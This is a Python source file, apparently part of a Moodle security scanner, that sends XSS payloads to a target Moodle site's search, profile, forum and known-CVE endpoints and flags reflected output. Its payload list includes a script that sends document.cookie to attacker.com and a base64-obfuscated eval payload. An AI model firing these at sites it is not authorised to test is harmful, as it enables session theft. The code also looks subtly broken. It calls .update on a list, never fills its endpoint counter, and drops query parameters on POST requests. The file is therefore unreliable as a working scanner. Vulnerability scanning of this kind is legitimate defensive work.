#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Module for testing XSS vulnerabilities in Moodle
Part of the Moodle Security Scanner project
"""

import re
import requests
import logging
import time
import random
import string
import urllib.parse
from bs4 import BeautifulSoup
from typing import List, Dict, Any, Optional, Union, Set

class MoodleXSSTester:
    """Class for testing XSS vulnerabilities in Moodle"""
    
    def __init__(
        self, 
        target_url: str, 
        logger: Optional[logging.Logger] = None, 
        timeout: int = 30, 
        proxy: Optional[str] = None, 
        cookies: Optional[Dict[str, str]] = None, 
        delay: float = 0,
        user_agent: Optional[str] = None,
        verify_ssl: bool = True
    ) -> None:
        """Initialize the Moodle XSS tester
        
        Args:
            target_url: Target Moodle URL
            logger: Logger instance
            timeout: Request timeout in seconds
            proxy: Proxy URL
            cookies: Dictionary of cookies
            delay: Delay between requests in seconds
            user_agent: User agent string to use
            verify_ssl: Whether to verify SSL certificates
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.proxy = proxy
        self.cookies = cookies or {}
        self.delay = delay
        self.user_agent = user_agent
        self.verify_ssl = verify_ssl
        self.version_info = None
        
        # XSS payloads to test
        self.xss_payloads = [
            {"type": "basic", "payload": "<script>alert(1)</script>"},
            {"type": "html", "payload": "<img src=x onerror=alert(1)>"},
            {"type": "event", "payload": "<svg onload=alert(1)>"},
            {"type": "basic", "payload": "<a onmouseover=alert(1)>xss link</a>"},
            {"type": "basic", "payload": "javascript:alert(1)"},
            {"type": "basic", "payload": "<body onload=alert(1)>"},
            {"type": "basic", "payload": "<iframe src=\"javascript:alert(1)\"></iframe>"},
            {"type": "basic", "payload": "<video><source onerror=\"javascript:alert(1)\">"},
            {"type": "basic", "payload": "<details open ontoggle=alert(1)>"},
            {"type": "basic", "payload": "<marquee onstart=alert(1)>"},
            {"type": "basic", "payload": "'>\"><script>alert(1)</script>"},
            {"type": "basic", "payload": "';alert(1);//"},
            {"type": "basic", "payload": "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"},
            {"type": "basic", "payload": "<img src=x onerror=\"eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))\">"},
            {"type": "basic", "payload": "<svg><g onload=\"javascript:alert(1)\"></g></svg>"}
        ]
        
        # Reflected XSS potential entry points
        self.reflected_xss_params = [
            "search", "query", "q", "id", "name", "keyword", "term", "file", 
            "url", "return", "returnurl", "redirect", "link", "dir", "path", 
            "page", "message", "error", "success", "info", "warning"
        ]
        
        # Set up logging
        if logger:
            self.logger = logger
        else:
            self.logger = logging.getLogger("MoodleXSSTester")
            self.logger.setLevel(logging.INFO)
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)
        
        # Initialize HTTP session with security settings
        self.session = requests.Session()
        
        # Configure the session
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        
        if cookies:
            self.session.cookies.update(cookies)
            
        # Set a secure default user agent if none provided
        if user_agent:
            self.session.headers.update({"User-Agent": user_agent})
        else:
            self.session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            })
            
        # Add security-related headers
        self.session.headers.update({
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        })
        
    def set_version_info(self, version_info):
        """Set version information to guide testing"""
        self.version_info = version_info
    
    def run_tests(self) -> Dict[str, List[Dict[str, Any]]]:
        """
        Run all XSS tests and compile results
        
        Returns:
            Dictionary with vulnerabilities and information
        """
        self.logger.info("Running XSS vulnerability tests...")
        
        results = {
            "vulnerabilities": [],
            "info": []
        }
        
        # Track tested endpoints to avoid duplicates
        tested_endpoints = set()
        
        try:
            # Test for reflected XSS
            self.logger.info("Testing for reflected XSS vulnerabilities...")
            reflected_vulns = self.test_reflected_xss()
            if reflected_vulns:
                results["vulnerabilities"].extend(reflected_vulns)
                self.logger.info(f"Found {len(reflected_vulns)} reflected XSS vulnerabilities")
            
            # Test for stored XSS (requires authentication)
            self.logger.info("Testing for stored XSS vulnerabilities...")
            stored_vulns = self.test_stored_xss()
            if stored_vulns:
                results["vulnerabilities"].extend(stored_vulns)
                self.logger.info(f"Found {len(stored_vulns)} stored XSS vulnerabilities")
            
            # Test specific vulnerabilities by version
            if self.version_info and self.version_info.get("version"):
                version = self.version_info.get("version")
                self.logger.info(f"Testing for version-specific XSS vulnerabilities in Moodle {version}...")
                version_vulns = self.test_version_specific_xss(version)
                if version_vulns:
                    results["vulnerabilities"].extend(version_vulns)
                    self.logger.info(f"Found {len(version_vulns)} version-specific XSS vulnerabilities")
            
            # Test for DOM-based XSS
            self.logger.info("Testing for DOM-based XSS vulnerabilities...")
            dom_vulns = self.test_dom_xss()
            if dom_vulns:
                results["vulnerabilities"].extend(dom_vulns)
                self.logger.info(f"Found {len(dom_vulns)} DOM-based XSS vulnerabilities")
            
            # Test specific known CVEs
            self.logger.info("Testing for known XSS vulnerabilities (CVEs)...")
            cve_vulns = self.test_known_xss_cves()
            if cve_vulns:
                results["vulnerabilities"].extend(cve_vulns)
                self.logger.info(f"Found {len(cve_vulns)} known XSS vulnerabilities")
            
            # Add information about the testing
            results["info"].append({
                "title": "XSS Testing Summary",
                "description": f"Tested {len(tested_endpoints)} unique endpoints with {len(self.xss_payloads)} XSS payloads.",
                "severity": "Info"
            })
        
        except Exception as e:
            self.logger.error(f"Error during XSS testing: {str(e)}")
            results["info"].append({
                "title": "XSS Testing Error",
                "description": f"An error occurred during XSS testing: {str(e)}",
                "severity": "Info"
            })
        
        self.logger.info(f"XSS vulnerability testing completed. Found {len(results['vulnerabilities'])} vulnerabilities.")
        return results
    
    def test_reflected_xss(self) -> List[Dict[str, Any]]:
        """
        Test for reflected XSS vulnerabilities in common Moodle pages
        
        Returns:
            List of found vulnerabilities
        """
        vulnerabilities = []
        
        # Common pages that might be vulnerable to reflected XSS
        potential_targets = [
            "/search/index.php",
            "/user/index.php",
            "/course/index.php",
            "/mod/forum/search.php",
            "/login/forgot_password.php",
            "/user/profile.php",
            "/message/index.php",
            "/calendar/view.php",
            "/admin/search.php",
            "/enrol/index.php",
            "/tag/search.php",
            "/mod/data/view.php",
            "/question/edit.php"
        ]
        
        # Keep track of tested URLs to avoid duplicates
        tested_urls = set()
        
        # Test each target page
        for target in potential_targets:
            url = f"{self.target_url}{target}"
            
            # Skip if already tested
            if url in tested_urls:
                continue
                
            tested_urls.add(url)
            
            # First, check if the page is accessible
            response = self._safe_request("get", url)
            if not response or response.status_code != 200:
                self.logger.debug(f"Skipping {target} - Status: {response.status_code if response else 'No response'}")
                continue
            
            # Extract form parameters if there's a form
            form_params = self._extract_form_params(response.text)
            if form_params:
                self.logger.debug(f"Found {len(form_params)} form parameters on {target}")
                self.reflected_xss_params.update(form_params)
            
            # Test each parameter with payloads
            params_to_test = self.reflected_xss_params.copy()  # Create a copy to avoid modification during iteration
            for param in params_to_test:
                # Test with a subset of payloads first for efficiency
                test_payloads = [p for p in self.xss_payloads if p["type"] in ["basic", "html", "event"]][:5]
                
                for payload_info in test_payloads:
                    payload = payload_info["payload"]
                    encoded_payload = urllib.parse.quote(payload)
                    test_params = {param: payload}
                    
                    # Make the request with the payload
                    test_url = f"{url}?{param}={encoded_payload}"
                    if test_url in tested_urls:
                        continue
                        
                    tested_urls.add(test_url)
                    
                    response = self._safe_request("get", url, params=test_params)
                    if not response:
                        continue
                    
                    # Check if the payload is reflected and potentially executable
                    if payload in response.text or encoded_payload in response.text:
                        if self._check_xss_executed(response.text, payload):
                            self.logger.warning(f"Potential reflected XSS found on {target} with parameter {param}")
                            
                            # Test additional payloads to verify the vulnerability
                            additional_payloads = [p for p in self.xss_payloads if p not in test_payloads][:3]
                            confirmed = False
                            
                            # Try more payloads to confirm it's not a false positive
                            for additional_payload_info in additional_payloads:
                                additional_payload = additional_payload_info["payload"]
                                test_params = {param: additional_payload}
                                
                                confirmation_response = self._safe_request("get", url, params=test_params)
                                if confirmation_response and self._check_xss_executed(confirmation_response.text, additional_payload):
                                    confirmed = True
                                    break
                            
                            # Only report if confirmed with multiple payloads or strong evidence
                            if confirmed or "script" in payload.lower() and "<script" in response.text.lower():
                                vulnerabilities.append({
                                    "title": "Reflected XSS Vulnerability",
                                    "description": f"The {target} page is vulnerable to reflected XSS via the {param} parameter.",
                                    "severity": "High",
                                    "evidence": f"Payload: {payload}\nURL: {url}?{param}={encoded_payload}",
                                    "payload": payload,
                                    "url": f"{url}?{param}={encoded_payload}",
                                    "param": param,
                                    "remediation": "Implement proper input validation and output encoding for user-supplied data.",
                                    "cwe": "CWE-79"
                                })
                                
                                # No need to test more payloads for this parameter
                                break
        
        return vulnerabilities
    
    def test_stored_xss(self) -> List[Dict[str, Any]]:
        """
        Test for stored XSS vulnerabilities in Moodle forum posts, profiles, etc.
        This requires authentication and is limited to detection rather than actual exploitation
        
        Returns:
            List of found vulnerabilities
        """
        # Note: Actual stored XSS testing would require authentication and content creation
        # For security scanner purposes, we'll check for common input fields that might be vulnerable
        
        vulnerabilities = []
        
        # Common areas where stored XSS might be possible
        potential_targets = [
            "/user/edit.php",
            "/mod/forum/post.php",
            "/blog/edit.php",
            "/comment/comment.php",
            "/mod/data/edit.php",
            "/mod/glossary/edit.php",
            "/mod/wiki/edit.php"
        ]
        
        for target in potential_targets:
            url = f"{self.target_url}{target}"
            
            response = self._safe_request("get", url)
            if not response:
                continue
                
            # Check if we have access to this page (might require login)
            if response.status_code != 200 or "login" in response.url.lower():
                self.logger.debug(f"Access denied or login required for {target}")
                continue
            
            # Look for forms with HTML editors or rich text areas
            soup = BeautifulSoup(response.text, "html.parser")
            editors = soup.find_all(["textarea", "div"], {"class": ["editor_atto", "editor_tinymce", "htmlarea"]})
            
            if editors:
                self.logger.info(f"Found potential stored XSS entry points in {target}")
                
                vulnerabilities.append({
                    "title": "Potential Stored XSS Entry Point",
                    "description": f"The {target} page contains HTML/rich text editors that could be vulnerable to stored XSS if not properly sanitized.",
                    "severity": "Medium",
                    "evidence": f"Found {len(editors)} editor fields on page {target}",
                    "url": url,
                    "remediation": "Ensure proper sanitization of HTML input using HTML Purifier or similar library.",
                    "certainty": "Low",  # Not confirmed, just potential
                    "cwe": "CWE-79"
                })
        
        return vulnerabilities
    
    def test_dom_xss(self) -> List[Dict[str, Any]]:
        """
        Test for DOM-based XSS vulnerabilities in Moodle pages
        
        Returns:
            List of found vulnerabilities
        """
        vulnerabilities = []
        
        # DOM-based XSS often occurs in hash fragments or client-side processing
        # Look for JavaScript that might use location.hash, document.URL, etc.
        
        # Pages that might have client-side URL processing
        potential_targets = [
            "/",
            "/index.php",
            "/course/view.php",
            "/mod/quiz/view.php",
            "/my/",
            "/user/profile.php"
        ]
        
        dom_xss_params = ["#q", "#search", "#page", "#section", "#tab", "#anchor"]
        
        for target in potential_targets:
            url = f"{self.target_url}{target}"
            
            response = self._safe_request("get", url)
            if not response or response.status_code != 200:
                continue
            
            # Extract all JavaScript code
            soup = BeautifulSoup(response.text, "html.parser")
            scripts = [script.string for script in soup.find_all("script") if script.string]
            
            # Check for potential DOM XSS sinks
            dom_xss_sinks = [
                "document.write", 
                "innerHTML", 
                "outerHTML", 
                "insertAdjacentHTML",
                ".html(", 
                "$(", 
                "eval(", 
                "setTimeout(", 
                "setInterval("
            ]
            
            dom_xss_sources = [
                "location.hash", 
                "location.href", 
                "location.search", 
                "document.URL", 
                "document.documentURI", 
                "document.referrer",
                "window.name"
            ]
            
            # Check if scripts contain both sources and sinks
            has_sink = any(sink in script for script in scripts for sink in dom_xss_sinks)
            has_source = any(source in script for script in scripts for source in dom_xss_sources)
            
            if has_sink and has_source:
                self.logger.info(f"Potential DOM XSS found on {target}")
                
                # Try to verify with some test payloads in the URL fragment
                for param in dom_xss_params:
                    for payload_info in self.xss_payloads[:3]:  # Test first few payloads
                        payload = payload_info["payload"]
                        encoded_payload = urllib.parse.quote(payload)
                        test_url = f"{url}{param}={encoded_payload}"
                        
                        # This check is limited as we can't execute JavaScript
                        # A more thorough test would require browser automation
                        
                        vulnerabilities.append({
                            "title": "Potential DOM-based XSS",
                            "description": f"The {target} page contains JavaScript that may be vulnerable to DOM-based XSS.",
                            "severity": "Medium",
                            "evidence": f"Page contains both DOM XSS sources and sinks. Test URL: {test_url}",
                            "url": test_url,
                            "remediation": "Use safe DOM manipulation methods and sanitize user input before using it in JavaScript.",
                            "certainty": "Low",  # DOM XSS is hard to detect without browser automation
                            "cwe": "CWE-79"
                        })
                        break  # One payload is enough for reporting
                    break  # One parameter is enough for reporting
        
        return vulnerabilities
    
    def test_version_specific_xss(self, version: str) -> List[Dict[str, Any]]:
        """
        Test for version-specific XSS vulnerabilities based on the detected Moodle version
        
        Args:
            version: Detected Moodle version string
            
        Returns:
            List of found vulnerabilities
        """
        vulnerabilities = []
        
        # Map of known XSS vulnerabilities by Moodle version
        # Format: version_prefix: [list of vulnerability details]
        known_vulnerabilities = {
            "3.5": [
                {
                    "endpoint": "/lib/editor/atto/autosave-ajax.php",
                    "params": {"elementid": "<script>alert(1)</script>"},
                    "cve": "CVE-2019-3847",
                    "method": "get"
                }
            ],
            "3.6": [
                {
                    "endpoint": "/question/question.php",
                    "params": {"cmid": "1<script>alert(1)</script>"},
                    "cve": "CVE-2020-14432",
                    "method": "get"
                }
            ],
            "3.7": [
                {
                    "endpoint": "/user/profile.php",
                    "params": {"id": "1<script>alert(1)</script>"},
                    "cve": "CVE-2019-14890",
                    "method": "get"
                }
            ],
            "3.8": [
                {
                    "endpoint": "/lib/ajax/service.php",
                    "params": {"info": "<script>alert(1)</script>"},
                    "cve": "CVE-2020-25627",
                    "method": "post",
                    "json": {
                        "index": 0,
                        "methodname": "core_fetch_notifications",
                        "args": {}
                    }
                }
            ],
            "3.9": [
                {
                    "endpoint": "/my/index.php",
                    "params": {"section": "<script>alert(1)</script>"},
                    "cve": "CVE-2020-25629",
                    "method": "get"
                }
            ]
        }
        
        # Check for version-specific vulnerabilities
        for ver_prefix, vulns in known_vulnerabilities.items():
            if version.startswith(ver_prefix):
                self.logger.info(f"Found potential XSS vulnerabilities for Moodle {ver_prefix}")
                
                for vuln_details in vulns:
                    endpoint = vuln_details["endpoint"]
                    params = vuln_details["params"]
                    method = vuln_details.get("method", "get")
                    cve = vuln_details.get("cve", "Unknown")
                    
                    url = f"{self.target_url}{endpoint}"
                    
                    if method.lower() == "get":
                        response = self._safe_request("get", url, params=params)
                    else:  # POST
                        json_data = vuln_details.get("json")
                        data = vuln_details.get("data")
                        response = self._safe_request("post", url, params=params, 
                                                     json=json_data, data=data)
                    
                    if response and any(p in response.text for p in params.values()):
                        # Check if the payload appears to be executable
                        if any(self._check_xss_executed(response.text, p) for p in params.values()):
                            self.logger.warning(f"Version-specific XSS found: {cve} on {endpoint}")
                            
                            vulnerabilities.append({
                                "title": f"Version-specific XSS Vulnerability ({cve})",
                                "description": f"The Moodle installation is vulnerable to a known XSS vulnerability ({cve}) affecting version {ver_prefix}.",
                                "severity": "High",
                                "evidence": f"Payload reflected in response from {endpoint}",
                                "url": url,
                                "cve": cve,
                                "method": method.upper(),
                                "params": str(params),
                                "remediation": f"Update Moodle to a version that fixes {cve}.",
                                "cwe": "CWE-79"
                            })
        
        return vulnerabilities
    
    def test_known_xss_cves(self) -> List[Dict[str, Any]]:
        """
        Test for specific known XSS vulnerabilities with assigned CVEs
        
        Returns:
            List of found vulnerabilities
        """
        vulnerabilities = []
        
        # Test for CVE-2022-35651 (SCORM XSS)
        scorm_vuln = self._test_scorm_xss()
        if scorm_vuln:
            vulnerabilities.append(scorm_vuln)
            
        # Test for CVE-2021-36393 (Atto Editor XSS)
        atto_vuln = self._test_atto_editor_xss()
        if atto_vuln:
            vulnerabilities.append(atto_vuln)
            
        # Test for CVE-2021-40690 (Quiz Question Format XSS)
        quiz_vuln = self._test_quiz_question_xss()
        if quiz_vuln:
            vulnerabilities.append(quiz_vuln)
            
        return vulnerabilities
    
    def _test_scorm_xss(self) -> Optional[Dict[str, Any]]:
        """
        Test for SCORM XSS vulnerability (CVE-2022-35651)
        
        Returns:
            Vulnerability details if found, None otherwise
        """
        # CVE-2022-35651: XSS in SCORM module
        target = "/mod/scorm/player.php"
        url = f"{self.target_url}{target}"
        
        payload = "1&x=<script>alert(1)</script>"
        params = {"scoid": payload}
        
        response = self._safe_request("get", url, params=params)
        if not response:
            return None
            
        # Check if vulnerable
        if "<script>alert(1)</script>" in response.text and self._check_xss_executed(response.text, "<script>alert(1)</script>"):
            return {
                "title": "SCORM Module XSS Vulnerability",
                "description": "The SCORM module is vulnerable to cross-site scripting via the scoid parameter (CVE-2022-35651).",
                "severity": "High",
                "evidence": f"Payload reflected in response from {target}",
                "url": f"{url}?scoid={urllib.parse.quote(payload)}",
                "cve": "CVE-2022-35651",
                "remediation": "Update Moodle to version 4.0.4, 3.11.8, 3.10.11, or higher.",
                "cwe": "CWE-79"
            }
            
        return None
    
    def _test_atto_editor_xss(self) -> Optional[Dict[str, Any]]:
        """
        Test for Atto Editor XSS vulnerability (CVE-2021-36393)
        
        Returns:
            Vulnerability details if found, None otherwise
        """
        # CVE-2021-36393: XSS in Atto HTML editor
        target = "/lib/editor/atto/plugins/html/ajax.php"
        url = f"{self.target_url}{target}"
        
        payload = "<script>alert(1)</script>"
        data = {
            "action": "save",
            "contextid": "1",
            "sesskey": "any",  # Would need a valid sesskey in a real test
            "content": payload
        }
        
        response = self._safe_request("post", url, data=data)
        if not response:
            return None
            
        # Check response for indications of vulnerability
        # This is a partial check as we can't get a valid sesskey without authentication
        if response.status_code == 200 and ("success" in response.text.lower() or payload in response.text):
            return {
                "title": "Atto Editor HTML Plugin XSS Vulnerability",
                "description": "The Atto HTML editor plugin may be vulnerable to stored XSS (CVE-2021-36393).",
                "severity": "High",
                "evidence": f"Response from {target} suggests vulnerability may be present",
                "url": url,
                "cve": "CVE-2021-36393",
                "remediation": "Update Moodle to version 3.11.1, 3.10.4, 3.9.7, or higher.",
                "certainty": "Low",  # Can't fully verify without valid sesskey
                "cwe": "CWE-79"
            }
            
        return None
    
    def _test_quiz_question_xss(self) -> Optional[Dict[str, Any]]:
        """
        Test for Quiz Question Format XSS vulnerability (CVE-2021-40690)
        
        Returns:
            Vulnerability details if found, None otherwise
        """
        # CVE-2021-40690: XSS in GIFT question format
        target = "/question/format.php"
        url = f"{self.target_url}{target}"
        
        payload = "<script>alert(1)</script>"
        params = {
            "category": "1",
            "format": "gift",
            "q": payload
        }
        
        response = self._safe_request("get", url, params=params)
        if not response:
            return None
            
        # Check if vulnerable
        if payload in response.text and self._check_xss_executed(response.text, payload):
            return {
                "title": "Quiz Question Format XSS Vulnerability",
                "description": "The GIFT question format import is vulnerable to cross-site scripting (CVE-2021-40690).",
                "severity": "High",
                "evidence": f"Payload reflected in response from {target}",
                "url": f"{url}?format=gift&q={urllib.parse.quote(payload)}",
                "cve": "CVE-2021-40690",
                "remediation": "Update Moodle to version 3.11.2, 3.10.5, 3.9.8, or higher.",
                "cwe": "CWE-79"
            }
            
        return None
    
    def _extract_form_params(self, html_content):
        """Extract parameter names from forms in the HTML content"""
        soup = BeautifulSoup(html_content, 'html.parser')
        form_params = []
        
        # Find all forms
        forms = soup.find_all('form')
        for form in forms:
            # Find all input elements
            inputs = form.find_all(['input', 'textarea', 'select'])
            for input_elem in inputs:
                if input_elem.has_attr('name'):
                    form_params.append(input_elem['name'])
        
        return form_params
    
    def _check_xss_executed(self, html_content, payload):
        """
        Check if the XSS payload might be executed based on how it appears in the HTML
        Returns True if it seems like the payload might be executed, False otherwise
        """
        # If payload is not in the content, it's not executed
        if payload not in html_content:
            return False
        
        # Simple heuristic checks
        # 1. Check if payload appears inside HTML attribute values with proper quotes
        attr_pattern = f'="[^"]*{re.escape(payload)}[^"]*"'
        if re.search(attr_pattern, html_content):
            return False
        
        # 2. Check if payload is HTML-encoded
        encoded_chars = ['&lt;', '&gt;', '&quot;', '&#039;', '&amp;']
        for char in encoded_chars:
            if char in html_content and char not in payload:
                return False
        
        # 3. Check if script tags in payload are intact
        if "<script>" in payload and "</script>" in payload:
            script_pattern = f'{re.escape("<script>")}.*?{re.escape("</script>")}'
            if not re.search(script_pattern, html_content, re.DOTALL):
                return False
        
        # If none of the above checks failed, the payload might be executed
        return True
    
    def _safe_request(self, method, url, params=None, json=None, data=None):
        """
        Safely make a request to the target URL
        
        Args:
            method: HTTP method (e.g., 'get', 'post')
            url: Target URL
            params: Query parameters
            json: JSON data for POST requests
            data: Form data for POST requests
            
        Returns:
            Response object if successful, None otherwise
        """
        try:
            if method.lower() == "get":
                response = self.session.get(url, params=params, timeout=self.timeout)
            elif method.lower() == "post":
                response = self.session.post(url, json=json, data=data, timeout=self.timeout)
            else:
                raise ValueError(f"Unsupported HTTP method: {method}")
            
            if response.status_code in [200, 301, 302]:
                return response
            else:
                self.logger.debug(f"Request to {url} returned status code {response.status_code}")
                return None
        except Exception as e:
            self.logger.debug(f"Error making {method} request to {url}: {str(e)}")
            return None 